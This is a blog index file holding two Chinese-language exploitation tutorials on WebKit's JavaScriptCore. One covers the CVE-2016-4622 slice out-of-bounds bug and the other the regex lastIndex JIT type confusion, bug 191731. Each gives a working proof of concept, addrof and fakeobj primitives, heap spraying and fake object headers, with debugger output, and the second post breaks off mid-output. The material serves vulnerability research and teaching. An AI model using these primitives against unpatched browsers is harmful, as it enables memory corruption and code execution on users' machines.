<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Javascript engine exploit 3</title>
      <link href="/2019/10/30/Javascript-engine-exploit-3/"/>
      <url>/2019/10/30/Javascript-engine-exploit-3/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.anquanke.com/post/id/183882" target="_blank" rel="noopener">首发于安全客：https://www.anquanke.com/post/id/183882</a></p><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>这次准备介绍一个经典的bug：<a href="https://www.zerodayinitiative.com/advisories/ZDI-16-485/" target="_blank" rel="noopener">CVE 2016 4622</a></p><p>这个bug也是第一篇介绍到的文章<a href="http://phrack.com/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">Attacking JavaScript Engines</a>中提到的，saelo在文章中对漏洞相关的技术介绍得很清楚，网上也有很多人对这个漏洞进行了复现，我没有在前面对这个漏洞进行介绍是因为这个洞算是比较老了（其实主要是在我机器上编译不了）。</p><p>但是前段时间看到了一篇文章：<a href="http://d1iv3.me/2019/07/06/WebKit-JSC-CVE-2016-4622%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">WebKit JSC CVE-2016-4622调试分析</a></p><p>发现还是有人遇到了同样的情况，文章中给出了在新分支中打上vuln patch的方式，patch的方案和文件来源：<a href="https://github.com/m1ghtym0/write-ups/tree/master/browser/CVE-2016-4622" target="_blank" rel="noopener">https://github.com/m1ghtym0/write-ups/tree/master/browser/CVE-2016-4622</a></p><h3 id="0x01-POC"><a href="#0x01-POC" class="headerlink" title="0x01 POC"></a>0x01 POC</h3><pre><code class="javascript">var a = [];for (var i = 0; i &lt; 100; i++)    a.push(i + 0.123);var b = a.slice(0, {      valueOf: function() {        a.length = 0;       return 10;       }    });print(b);//0.123,1.123,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314</code></pre><h3 id="0x02-Slice"><a href="#0x02-Slice" class="headerlink" title="0x02 Slice"></a>0x02 Slice</h3><p>poc很简洁，这是一个数组越界访问（OOB）的漏洞。漏洞出现在<code>Array.prototype.slice</code>的实现中，具体的函数是<code>arrayProtoFuncSlice</code>：</p><pre><code class="javascript">EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)    {      /* [[ 1 ]] */      JSObject* thisObj = exec-&gt;thisValue()                         .toThis(exec, StrictMode)                         .toObject(exec);      if (!thisObj)        return JSValue::encode(JSValue());      /* [[ 2 ]] */      unsigned length = getLength(exec, thisObj);      if (exec-&gt;hadException())        return JSValue::encode(jsUndefined());      /* [[ 3 ]] */      unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length);      unsigned end =          argumentClampedIndexFromStartOrEnd(exec, 1, length, length);      /* [[ 4 ]] */      std::pair&lt;SpeciesConstructResult, JSObject*&gt; speciesResult =        speciesConstructArray(exec, thisObj, end - begin);      // We can only get an exception if we call some user function.      if (UNLIKELY(speciesResult.first ==      SpeciesConstructResult::Exception))        return JSValue::encode(jsUndefined());      /* [[ 5 ]] */      if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp;            isJSArray(thisObj))) {        if (JSArray* result =                asArray(thisObj)-&gt;fastSlice(*exec, begin, end - begin))          return JSValue::encode(result);      }      JSObject* result;      if (speciesResult.first == SpeciesConstructResult::CreatedObject)        result = speciesResult.second;      else        result = constructEmptyArray(exec, nullptr, end - begin);      unsigned n = 0;      for (unsigned k = begin; k &lt; end; k++, n++) {        JSValue v = getProperty(exec, thisObj, k);        if (exec-&gt;hadException())          return JSValue::encode(jsUndefined());        if (v)          result-&gt;putDirectIndex(exec, n, v);      }      setLength(exec, result, n);      return JSValue::encode(result);    }</code></pre><ol><li>取得调用方法的对象（在这里是数组对象）</li><li>得到数组的length</li><li>对参数进行转换得到start和end的index，并将它们限制在[0, length)的区间内</li><li>检查是否有构造函数可使用</li><li>执行切片</li></ol><p>最后执行切片一共有两种方式：</p><ol><li>如果是密集型存储的数组就执行<code>fastSlice</code>，使用<code>memcpy</code>拷贝数据到新数组。</li><li>如果<code>fastSlice</code>无法执行，就使用<code>slowSlice</code>，使用一个循环将元素一个一个放入新数组。</li></ol><p>值得注意的是在<code>fastSlice</code>中没有对数组边界的检查，看起来在前面的代码中已经对start和end的范围做了限制，所以很容易地认为在后面的代码中不会有数组越界的情况发生，但是saelo在文章中使用类型转换突破了这个限制。</p><h3 id="0x03-ValueOf"><a href="#0x03-ValueOf" class="headerlink" title="0x03 ValueOf"></a>0x03 ValueOf</h3><p>JavaScript属于“动态弱类型”语言，JavaScript在处理不同类型变量时会尝试去把变量转化成自己需要的类型，以<code>Math.abs()</code>为例：</p><pre><code class="javascript">&gt;&gt;&gt; Math.abs(-42)42&gt;&gt;&gt; Math.abs(&quot;-42&quot;)42&gt;&gt;&gt; Math.abs([])0&gt;&gt;&gt; Math.abs(true)1&gt;&gt;&gt; Math.abs({})NaN&gt;&gt;&gt; </code></pre><p>但是这种用法不适用于强类型语言，比如Python（Python属于“动态强类型”语言）。</p><p>如果一个对象有可以调用的<code>valueOf()</code>方法，当需要做类型转换时会获取这个方法的返回值作为转换的结果：</p><pre><code class="javascript">&gt;&gt;&gt; Math.abs({valueOf:function(){return 10;}})10</code></pre><p>有时候<code>toString()</code>也是有效的：</p><pre><code class="javascript">&gt;&gt;&gt; Math.abs({toString:function(){return &quot;10&quot;;}})10</code></pre><p>这也是为什么在poc中要给<code>slice()</code>传入带<code>valueOf()</code>方法的对象。</p><pre><code class="javascript">var b = a.slice(0, {      valueOf: function() {        a.length = 0;       return 10;       }    });</code></pre><p>表面上等效于：</p><pre><code class="javascript">var b = a.slice(0, 10);</code></pre><h3 id="0x04-Exploiting-with-“valueOf”"><a href="#0x04-Exploiting-with-“valueOf”" class="headerlink" title="0x04 Exploiting with “valueOf”"></a>0x04 Exploiting with “valueOf”</h3><p><code>arrayProtoFuncSlice()</code>中的参数类型转换发生在<code>argumentClampedIndexFromStartOrEnd()</code>执行的时候，该方法负责将start和end限制在[0, length)区间。</p><pre><code class="cpp">    JSValue value = exec-&gt;argument(argument);    if (value.isUndefined())        return undefinedValue;    double indexDouble = value.toInteger(exec);  // Conversion happens here    if (indexDouble &lt; 0) {        indexDouble += length;        return indexDouble &lt; 0 ? 0 : static_cast&lt;unsigned&gt;(indexDouble);    }    return indexDouble &gt; length ? length : static_cast&lt;unsigned&gt;(indexDouble);</code></pre><p>这段代码有个很明显的问题，这里用的<code>length</code>是前面获取到的，如果我们在类型转换时将数组实际的<code>length</code>缩小，由于这里的length不会更新，start和end表示的范围将会突破数组长度的限制。</p><p>再来看看重新设定数组长度之后会发生什么，具体的代码在<code>JSArray::setLength</code>：</p><pre><code class="cpp">    unsigned lengthToClear = butterfly-&gt;publicLength() - newLength;    unsigned costToAllocateNewButterfly = 64; // a heuristic.    if (lengthToClear &gt; newLength &amp;&amp;        lengthToClear &gt; costToAllocateNewButterfly) {        reallocateAndShrinkButterfly(exec-&gt;vm(), newLength);        return true;    }</code></pre><p>中间设置了一个<code>costToAllocateNewButterfly</code>是用来避免频繁申请内存空间的。</p><p>解读下这段代码的意思：<code>new length</code>减去<code>old length</code>的差值如果大于<code>new length</code>而且大于<code>costToAllocateNewButterfly</code>，就会为数组重新申请<code>butterfly</code>的内存。这里的<code>length</code>表示的不是字节数，而是slot的数量，也就是元素个数。</p><p>结合这部分的内容就很容易知道poc中打印出来的<code>b</code>的内容大概是什么了。就是<code>a</code>重新分配的<code>butterfly</code>紧挨着的内存区域的数据。但是我们仍然不知道泄漏出来的数据具体是什么，属于哪个对象。</p><h3 id="0x05-JavaScriptCore-Heap"><a href="#0x05-JavaScriptCore-Heap" class="headerlink" title="0x05 JavaScriptCore Heap"></a>0x05 JavaScriptCore Heap</h3><p>Butterfly的分配是在JSC的Heap中进行的，对于大小相近的Butterfly，他们会被分配到一片连续的内存空间中：</p><pre><code class="javascript">a = [1.1];a[0] = 1.8;print(describe(a));b = [{}];print(describe(b));</code></pre><pre><code class="shell">Object: 0x1072b42b0 with butterfly 0x8000fe4a8 (Structure 0x1072f2a00:[Array, {}, ArrayWithDouble, Proto:0x1072c80a0, Leaf]), StructureID: 97Object: 0x1072b42c0 with butterfly 0x8000fe4c8 (Structure 0x1072f2a70:[Array, {}, ArrayWithContiguous, Proto:0x1072c80a0]), StructureID: 98</code></pre><p>可以看到两个Array的Butterfly是连在一起的，这个对于长度被缩小后内存被重新分配的Array也是一样的：</p><pre><code class="javascript">a = [];for (var i = 0; i &lt; 100; i++)     a.push(i + 0.123);a.length = 0;print(describe(a));b = [{}];print(describe(b));</code></pre><pre><code class="shell">Object: 0x106ab42b0 with butterfly 0x8000fe4a8 (Structure 0x106af2a00:[Array, {}, ArrayWithDouble, Proto:0x106ac80a0, Leaf]), StructureID: 97Object: 0x106ab42c0 with butterfly 0x8000fe4c8 (Structure 0x106af2a70:[Array, {}, ArrayWithContiguous, Proto:0x106ac80a0]), StructureID: 98</code></pre><p>那我们就可以很清楚的知道，前面通过POC泄漏出来的数据就是其他对象的butterfly。那么如果我们收缩Array之后紧接着分配一个大小相近的Array，就应该可以读取到第二个Array的butterfly了，如果里面保存的是对象那么我们就可以泄漏这个对象的地址了。</p><h3 id="0x06-Addrof"><a href="#0x06-Addrof" class="headerlink" title="0x06 Addrof"></a>0x06 Addrof</h3><p>结合POC：</p><pre><code class="javascript">a = [];for (var i = 0; i &lt; 100; i++)     a.push(i + 0.123);b = a.slice(0, {        valueOf: function() {            a.length = 0;             var leak_ary = [{}];            print(describe(a));            print(describe(leak_ary[0]));            return 10;         }    });print(describe(b));</code></pre><pre><code class="shell">#aObject: 0x1071b42b0 with butterfly 0x10000fe4a8 (Structure 0x1071f2a00:[Array, {}, ArrayWithDouble, Proto:0x1071c80a0, Leaf]), StructureID: 97#leak_aryObject: 0x1071b0080 with butterfly 0x0 (Structure 0x1071f2060:[Object, {}, NonArray, Proto:0x1071b4000]), StructureID: 75#bObject: 0x1071b42d0 with butterfly 0x10000e0078 (Structure 0x1071f2a00:[Array, {}, ArrayWithDouble, Proto:0x1071c80a0, Leaf]), StructureID: 97&gt;&gt;&gt; b0.123,1.123,1.5488838078e-314,6.3659873734e-314,2.180893412e-314,0,0,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314(lldb) x/6gx 0x10000e00780x10000e0078: 0x3fbf7ced916872b0 0x3ff1f7ced916872b0x10000e0088: 0x00000000badbeef0 0x00000003000000010x10000e0098: 0x00000001071b0080 0x0000000000000000</code></pre><p>通过查看<code>b</code>的butterfly可以看到里面已经保存了<code>leak_ary</code>的地址。通过直接输出<code>b</code>，我们获取第五个元素就可以得到泄漏出的对象地址了。封装<code>addrof()</code>如下：</p><pre><code class="javascript">function addrof(obj){    var a = [];    for (var i = 0; i &lt; 100; i++)         a.push(i + 0.123);    var b = a.slice(0, {            valueOf: function() {                a.length = 0;                 var leak_ary = [obj];                return 10;             }        }    );    return b[4];}</code></pre><h3 id="0x07-Fakeobj"><a href="#0x07-Fakeobj" class="headerlink" title="0x07 Fakeobj"></a>0x07 Fakeobj</h3><p>伪造对象也可以通过这个<code>oob</code>漏洞完成，和<code>addrof()</code>的区别就是，我们需要先将<code>a</code>转化为<code>ArrayWithContigous</code>，在<code>a</code>缩小之后，申请一个<code>ArrayWithDouble</code>，并将要伪造的对象地址写进去，构造如下：</p><pre><code class="javascript">function fakeobj(addr){    var a = [];    for (var i = 0; i &lt; 100; i++)         a.push(i + 0.123);    var b = a.slice(0, {            valueOf: function() {                a.length = 0;                a[0] = {};                var arr = [1.1];                arr[0] = addr;                return 10;             }        }    );    return b[4];}</code></pre><p>我构造出来的<code>addrof()</code>和<code>fakeobj()</code>会和saelo的不太一样，因为我是根据自己对漏洞的理解写的，saelo的构造比我更加简洁：</p><p><strong>addrof@saelo</strong>：</p><pre><code class="javascript">function addrof(object) {        var a = [];        for (var i = 0; i &lt; 100; i++)            a.push(i + 0.1337);   // Array must be of type ArrayWithDoubles        var hax = {valueOf: function() {            a.length = 0;            a = [object];            return 4;        }};        var b = a.slice(0, hax);        return Int64.fromDouble(b[3]);}</code></pre><p><strong>fakeobj@saelo</strong>：</p><pre><code class="javascript">function fakeobj(addr) {        var a = [];        for (var i = 0; i &lt; 100; i++)            a.push({});     // Array must be of type ArrayWithContiguous        addr = addr.asDouble();        var hax = {valueOf: function() {            a.length = 0;            a = [addr];            return 4;        }};        return a.slice(0, hax)[3];}</code></pre><h3 id="0x08-Exploit"><a href="#0x08-Exploit" class="headerlink" title="0x08 Exploit"></a>0x08 Exploit</h3><p>由于JSC在新加入了2016年并没有的漏洞缓解措施“Gigacage”，导致无法修改特定对象的<code>m_vector</code>的指针，比如<code>Float64Array</code>，所以saelo文章中的利用方法不适用于本文中打了patch的JSC，其实我们完全可以用上一篇文章中的利用方法，直接将除了<code>addrof()</code>和<code>fakeobj()</code>的部分复制过来就能用了。</p><p>当然这样有些不兼容的问题，我在代码中做了一些调整：<a href="https://github.com/joshua7o8v/Browser/blob/master/WebKit/cve-2016-4622/poc.js" target="_blank" rel="noopener">https://github.com/joshua7o8v/Browser/blob/master/WebKit/cve-2016-4622/poc.js</a></p><p>关于<code>poc.js</code>中不太理解的地方可以看上一篇文章。</p><h3 id="0x09-Reference"><a href="#0x09-Reference" class="headerlink" title="0x09 Reference"></a>0x09 Reference</h3><p>[1] <a href="https://github.com/joshua7o8v/Browser/tree/master/WebKit/cve-2016-4622" target="_blank" rel="noopener">https://github.com/joshua7o8v/Browser/tree/master/WebKit/cve-2016-4622</a></p><p>[2] <a href="http://www.phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">http://www.phrack.org/papers/attacking_javascript_engines.html</a></p><p>[3] <a href="http://d1iv3.me/2019/07/06/WebKit-JSC-CVE-2016-4622%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://d1iv3.me/2019/07/06/WebKit-JSC-CVE-2016-4622%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Browser </tag>
            
            <tag> JavascriptEngine </tag>
            
            <tag> JavascriptCore </tag>
            
            <tag> Webkit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript engine exploit 2</title>
      <link href="/2019/10/30/Javascript-engine-exploit-2/"/>
      <url>/2019/10/30/Javascript-engine-exploit-2/</url>
      
        <content type="html"><![CDATA[<p> <a href="https://www.anquanke.com/post/id/183805" target="_blank" rel="noopener">首发于安全客：https://www.anquanke.com/post/id/183805</a></p><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>这是2018年底的一个关于正则的bug，编号是191731。</p><p>关于这个Bug的描述和Diff：<a href="https://bugs.webkit.org/show_bug.cgi?id=191731" target="_blank" rel="noopener">About The Bug</a>、<a href="https://github.com/WebKit/webkit/commit/7cf9d2911af9f255e0301ea16604c9fa4af340e2?diff=split#diff-fb5fbac6e9d7542468cfeed930e241c0L66" target="_blank" rel="noopener">Diff</a></p><p>切换到漏洞分支编译：</p><pre><code class="bash">git checkout 3af5ce129e6636350a887d01237a65c2fce77823</code></pre><h3 id="0x01-POC"><a href="#0x01-POC" class="headerlink" title="0x01 POC"></a>0x01 POC</h3><pre><code class="javascript">var victim_array = [1.1];var reg = /abc/y;var val = 5.2900040263529e-310var funcToJIT = function() {    &#39;abc&#39;.match(reg);    victim_array[0] = val;}for (var i = 0; i &lt; 10000; ++i){    funcToJIT()}regexLastIndex = {};regexLastIndex.toString = function() {    victim_array[0] = {};    return &quot;0&quot;;};reg.lastIndex = regexLastIndex;funcToJIT()print(victim_array[0])</code></pre><p>直接用jsc运行的话会崩溃：</p><pre><code class="bash">$ ./WebKit.git/WebKitBuild/Debug/bin/jsc ./bug_191731/test/poc.js[1]    37939 segmentation fault  ./WebKit.git/WebKitBuild/Debug/bin/jsc ./bug_191731/test/poc.js</code></pre><p>可以用lldb加载jsc运行再看看：</p><pre><code class="bash">$ lldb ./WebKitBuild/Debug/bin/jsc(lldb) target create &quot;./WebKitBuild/Debug/bin/jsc&quot;Current executable set to &#39;./WebKitBuild/Debug/bin/jsc&#39; (x86_64).(lldb) run -i ../bug_191731/test/poc.jsProcess 37993 stopped* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = EXC_BAD_ACCESS (code=1, address=0x616161616166)    frame #0: 0x000000010000b90c jsc`JSC::JSCell::isString(this=0x0000616161616161) const at JSCellInlines.h:203:12   200   201     inline bool JSCell::isString() const   202     {-&gt; 203         return m_type == StringType;   204     }   205   206     inline bool JSCell::isBigInt() constTarget 0: (jsc) stopped.</code></pre><p>这里引用了一个<code>this</code>，<code>this=0x0000616161616161</code>，这个数据的来源是POC中的val。</p><p>这里很明显传入了一个double，但是取出来的却是一个对象，然后引用这个对象的时候造成了崩溃。这里简单叙述一下POC的过程：</p><ol><li>初始化一个Double数组。</li><li>初始化一个正则表达式对象，而且一定要加上<code>/y</code>标识。</li><li>随意初始化一个double变量。</li><li>创建一个函数，函数体内执行正则匹配，并对<code>victim_array[0]</code>传入double值。</li><li>让第四步创建的函数循环一万次，以触发JIT对它进行优化编译。</li><li>创建一个对象，重写该对象的<code>toString</code>方法，该方法给<code>victim_array[0]</code>赋值一个对象。</li><li>将<code>reg</code>的<code>lastIndex</code>属性赋值为刚创建的对象。</li><li>调用<code>funcToJIT</code>触发<code>toString</code>将<code>victim_array</code>转化为<code>JSValue</code>数组，然后放入val的值。</li><li>打印<code>victim_array[0]</code>触发对伪造对象的引用，引起崩溃。</li></ol><p>上面提到了一定要加上<code>/y</code>标识，这是因为每个正则对象都有一个<code>lastIndex</code>属性，每次进行匹配的时候都会读取这个属性作为匹配字符串的开头，如果<code>lastIndex</code>为0就是从字符串开头进行匹配，如果<code>lastIndex</code>为1就是从第二个字符开始进行匹配。加上<code>/y</code>之后，正则对象每次都会读取这个值作为开头，而且不管匹配是否成功，都会将<code>lastIndex</code>设置为上一次匹配结束的位置。</p><p>但是<code>/g</code>也会读取<code>lastIndex</code>，为什么不用<code>/g</code>？因为<code>/g</code>修饰过的正则每次匹配必须从字符串开头进行，我猜测可能是每次匹配开始时都会将<code>lastIndex</code>设置为0，这就导致我们没法利用这个属性，因为每次重写都会被覆盖为0。</p><p>这个POC的关键点在于，最后传入val的时候，JSC为什么不认为<code>val</code>是double类型，而认为它是一个对象？</p><p>在最后执行<code>funcToJIT()</code>之前：</p><pre><code class="shell">&gt;&gt;&gt; describe(victim_array)Object: 0x108ab4340 with butterfly 0x8000fe6a8 (Structure 0x108af2a70:[Array, {}, ArrayWithDouble, Proto:0x108ac80a0, Leaf]), StructureID: 98</code></pre><p>执行完成后：</p><pre><code class="shell">&gt;&gt;&gt; describe(victim_array)Object: 0x108ab4340 with butterfly 0x8000fe6a8 (Structure 0x108af2ae0:[Array, {}, ArrayWithContiguous, Proto:0x108ac80a0]), StructureID: 99</code></pre><p>问题就出在<code>funcToJIT</code>中，我们可以认为这个函数执行了两个步骤，一个是执行<code>toString</code>，另一个就是<code>victim_array[0] = val</code>。<code>toString</code>中执行<code>victim_array[0] = {}</code>，这一步JSC就将数组变成了<code>ArrayWithContigous</code>，说明JSC是知道传入了一个对象的。而执行<code>victim_array[0] = val</code>的时候，JSC就没认为它是一个double。这是因为<code>funcToJIT()</code>被JIT优化了，导致JSC没有对val的类型进行检查，也就没有对我们传入的值进行编码，我设置的<code>val=0x616161616161</code>，编码之后应该是<code>0x1616161616161</code>，这里没有编码，传进去之后就是原来的值，然而此时数组已经是<code>ArrayWithContigous</code>，根据JSC的<code>NaN-boxing</code>规则，<code>0x616161616161</code>就是一个指针。</p><p>double传入<code>ArrayWithDouble</code>-正常：</p><pre><code class="shell">(lldb) x/10gx 0x10000fe6c80x10000fe6c8: 0x0000616161616161 0x00000000badbeef00x10000fe6d8: 0x00000000badbeef0 0x00000000badbeef00x10000fe6e8: 0x00000000badbeef0 0x00000000badbeef00x10000fe6f8: 0x00000000badbeef0 0x00000000badbeef00x10000fe708: 0x00000000badbeef0 0x00000000badbeef0</code></pre><p>double传入<code>ArrayWithContigous</code>-正常：</p><pre><code class="shell">(lldb) x/10gx 0x10000fe6a80x10000fe6a8: 0x0001616161616161 0x00000000badbeef00x10000fe6b8: 0x00000000badbeef0 0x00000000badbeef00x10000fe6c8: 0x00000000badbeef0 0x00000000badbeef00x10000fe6d8: 0x00000000badbeef0 0x00000000badbeef00x10000fe6e8: 0x00000000badbeef0 0x00000000badbeef0</code></pre><p>double传入<code>ArrayWithContigous</code>-POC：</p><pre><code class="shell">(lldb) x/10gx 0x10000fe6a80x10000fe6a8: 0x0000616161616161 0x00000000badbeef00x10000fe6b8: 0x00000000badbeef0 0x00000000badbeef00x10000fe6c8: 0x00000000badbeef0 0x00000000badbeef00x10000fe6d8: 0x00000000badbeef0 0x00000000badbeef00x10000fe6e8: 0x00000000badbeef0 0x00000000badbeef0</code></pre><p>关于JIT的优化流程和内部细节可以看官方文档的描述：<a href="https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/" target="_blank" rel="noopener">Introducing the webkit ftl-jit</a></p><p>文档中有描述一个函数被调用多少次会触发DFG，</p><blockquote><p>The first execution of any function always starts in the interpreter tier. As soon as any statement in the function executes more than 100 times, or the function is called more than 6 times (whichever comes first), execution is diverted into code compiled by the <em>Baseline</em> JIT. This eliminates some of the interpreter’s overhead but lacks any serious compiler optimizations. Once any statement executes more than 1000 times in <em>Baseline</em> code, or the <em>Baseline</em> function is invoked more than 66 times, we divert execution again, to the DFG JIT.</p></blockquote><p>但是我实际测试过程中我把<code>funcToJIT()</code>的调用次数调到3670，就只是有几率触发DFG，所以还是把调用次数调大一点比较稳，但也不能太大，调用次数过多就会进入FTL。</p><h3 id="0x02-Exploit"><a href="#0x02-Exploit" class="headerlink" title="0x02 Exploit"></a>0x02 Exploit</h3><p>POC中通过传入设定好的double值成功伪造了一个指针，其实用相反的手法我们是可以做到泄漏对象地址的。我们可以先在数组中放入对象指针，然后以double的形式将指针打印出来，构造出来的<code>addrof()</code>原语如下：</p><pre><code class="javascript">function addrof(obj){    var victim_array = [1.1];    var reg = /abc/y;    var funcToJIT = function(array){        &#39;abc&#39;.match(reg);        return array[0];    }    for(var i=0; i&lt; 10000; i++){        funcToJIT(victim_array);    }    regexLastIndex = {};    regexLastIndex.toString = function(){        victim_array[0] = obj;        return &quot;0&quot;;    };    reg.lastIndex = regexLastIndex;    return funcToJIT(victim_array)}</code></pre><p>可以观察到，我这里在<code>funcToJIT()</code>加了一个参数，因为我发现不加这个参数直接操作<code>victim_array</code>的话似乎出现了两个<code>victim_array</code>，最后返回给我的是没有修改值的那个，加上参数就可解决这个问题，原因尚不清楚。</p><p>使用这个函数并传入一个对象，就会返回这个对象的地址：</p><pre><code class="shell">(lldb) run -i ../bug_191731/test/poc.jsThere is a running process, kill it and restart?: [Y/n] yProcess 39404 launched: &#39;/Users/7o8v/Documents/SecResearch/Browser/WebKit/WebKit.git/WebKitBuild/Debug/bin/jsc&#39; (x86_64)2.1938450464e-314&gt;&gt;&gt;</code></pre><p>但是返回的是double的形式，我没找到JavaScript有啥格式化比较方便的方法，最后看niklasb大佬的exp发现可以用<code>ArrayBuffer</code>解决，代码如下：</p><pre><code class="javascript">var buffer = new ArrayBuffer(8);var u8 = new Uint8Array(buffer);var u32 = new Uint32Array(buffer);var f64 = new Float64Array(buffer);var BASE = 0x100000000;function i2f(i) {    u32[0] = i%BASE;    u32[1] = i/BASE;    return f64[0];}function f2i(f) {    f64[0] = f;    return u32[0] + BASE*u32[1];}function hex(x) {    if (x &lt; 0)        return `-${hex(-x)}`;    return `0x${x.toString(16)}`;}</code></pre><p>通过申请一个8字节的buffer，并且用不同形式表示它可以很好解决格式化的问题。</p><pre><code class="shell">&gt;&gt;&gt; test = {}[object Object]&gt;&gt;&gt; hex(f2i(addrof(test)))0x1082b00c0&gt;&gt;&gt; describe(test)Object: 0x1082b00c0 with butterfly 0x0 (Structure 0x1082f20d0:[Object, {}, NonArray, Proto:0x1082b4000]), StructureID: 76&gt;&gt;&gt;</code></pre><p>可以看到确实泄漏出了对象的地址。</p><p>根据poc再构造一个<code>fakeobj()</code>：</p><pre><code class="javascript">function fakeobj(addr){    var victim_array = [1.1];    var reg = /abc/y;    var funcToJIT = function(array){        &#39;abc&#39;.match(reg);        array[0] = addr;    }    for(var i=0; i &lt; 10000; i++){        funcToJIT(victim_array);    }    regexLastIndex = {};    regexLastIndex.toString = function(){        victim_array[0] = {};        return &quot;0&quot;;    }    reg.lastIndex = regexLastIndex;    funcToJIT(victim_array);    return victim_array[0];}</code></pre><pre><code class="shell">&gt;&gt;&gt; test = {};[object Object]&gt;&gt;&gt; test_addr = f2i(addrof(test));4440391936&gt;&gt;&gt; hex(test_addr)0x108ab0100&gt;&gt;&gt; aaaa = fakeobj(i2f(test_addr))[object Object]&gt;&gt;&gt; describe(aaaa)Object: 0x108ab0100 with butterfly 0x0 (Structure 0x108af20d0:[Object, {}, NonArray, Proto:0x108ab4000]), StructureID: 76&gt;&gt;&gt; describe(test)Object: 0x108ab0100 with butterfly 0x0 (Structure 0x108af20d0:[Object, {}, NonArray, Proto:0x108ab4000]), StructureID: 76&gt;&gt;&gt;</code></pre><p>现在可以泄漏，可以伪造，那么就要想办法扩大我们的控制范围，尽量达到任意读写的目的。</p><p>现在<code>fakeobj()</code>传入任何地址JSC都会把它当作是一个对象的指针，那么我们就可以先泄漏出一个对象的地址，再在这个对象地址的基础上加上一个偏移，使得伪造对象地址处的数据变得可控，前面提到过对象的属性会存储在butterfly中，但是当该对象不是一个数组而且属性不超过6个的时候，就不会有butterfly，而是将这些属性的值存放在对象内部连续的内存中：</p><pre><code class="shell">&gt;&gt;&gt; test = {}[object Object]&gt;&gt;&gt; test.a = 5.2900040263529e-3105.2900040263529e-310&gt;&gt;&gt; test.b = 22&gt;&gt;&gt; test.c = 33&gt;&gt;&gt; test.d = 44&gt;&gt;&gt; test.e = 55&gt;&gt;&gt; test.f = 66&gt;&gt;&gt; describe(test)Object: 0x108ab0280 with butterfly 0x0 (Structure 0x108a71260:[Object, {a:0, b:1, c:2, d:3, e:4, f:5}, NonArray, Proto:0x108ab4000, Leaf]), StructureID: 329&gt;&gt;&gt;</code></pre><p>可以看到<code>test</code>对象并没有butterfly，再来看看<code>test</code>内部：</p><pre><code class="shell">(lldb) x/10gx 0x108ab02800x108ab0280: 0x0100160000000149 0x00000000000000000x108ab0290: 0x0001616161616161 0xffff0000000000020x108ab02a0: 0xffff000000000003 0xffff0000000000040x108ab02b0: 0xffff000000000005 0xffff0000000000060x108ab02c0: 0x00000000badbeef0 0x00000000badbeef0</code></pre><p>可以看到属性的值是被编码过的，这也提醒我们伪造数据的时候要减去0x10000000000。如果我们此时再增加属性，对象就会申请butterfly来存储数据，多余的属性值就会存储到butterfly中。</p><p>现在我们就可以开始伪造对象了，如果对JavaScript对象的结构还不是很了解的，推荐阅读：<a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">Attacking JavaScript Engines</a>。</p><h4 id="Fake-Object"><a href="#Fake-Object" class="headerlink" title="Fake Object"></a>Fake Object</h4><p>伪造对象需要先伪造一个header，但是header中包含一个structureID，这个值不好预测而且必须要一个有效的ID才可以。这个时候就可以使用spray技术提前创建大量的对象。structureID虽然不好预测，但也不是随机的值，而是随着对象数量的增加而变大的。所以我们提前创建大量的对象，并选取一个中间的值作为structureID，大概率就是有效的。</p><pre><code class="javascript">var spray = []for (var i = 0; i &lt; 1000; ++i) {    var obj = [1.1];    obj.a = 2.2;    obj[&#39;p&#39;+i] = 3.3;    spray.push(obj);}</code></pre><pre><code class="shell">&gt;&gt;&gt; describe(spray[0])Object: 0x108ab4390 with butterfly 0x8000dc058 (Structure 0x108a70f50:[Array, {a:100, p0:101}, ArrayWithDouble, Proto:0x108ac80a0, Leaf]), StructureID: 322&gt;&gt;&gt; describe(spray[999])Object: 0x108a14330 with butterfly 0x8000c3e08 (Structure 0x108a10e70:[Array, {a:100, p999:101}, ArrayWithDouble, Proto:0x108ac80a0, Leaf]), StructureID: 1321&gt;&gt;&gt;</code></pre><p>伪造的时候选取一个中间的值就可以了，其实这种方法还不是太稳，比较稳的做法是使用<code>instanceof</code>，不过只是练习就无所谓啦。</p><p>再看下spray出来的obj的header：</p><pre><code class="shell">(lldb) x/2gx 0x108ab43900x108ab4390: 0x0108210700000142 0x00000008000dc058</code></pre><p>header的数据就是<code>0x0108210700000142</code>，低四字节就是structrueID，高四字节就是flags，可以直接使用，可以认为这个flags表示的就是<code>ArrayWithDouble</code>（其实还包含了其他的信息）。伪造对象如下：</p><pre><code class="javascript">u32[0] = 0x200;u32[1] = 0x01082107 - 0x10000;var header_arrayDouble = f64[0];victim = {    fake_header:header_arrayDouble,};victim_addr = f2i(addrof(victim))hax = fakeobj(i2f(victim_addr+0x10))</code></pre><pre><code class="shell">&gt;&gt;&gt; describe(hax)Object: 0x1089c83b0 with butterfly 0x0 (Structure 0x10894a3e0:[Array, {a:100, p189:101}, ArrayWithDouble, Proto:0x1089c80a0, Leaf]), StructureID: 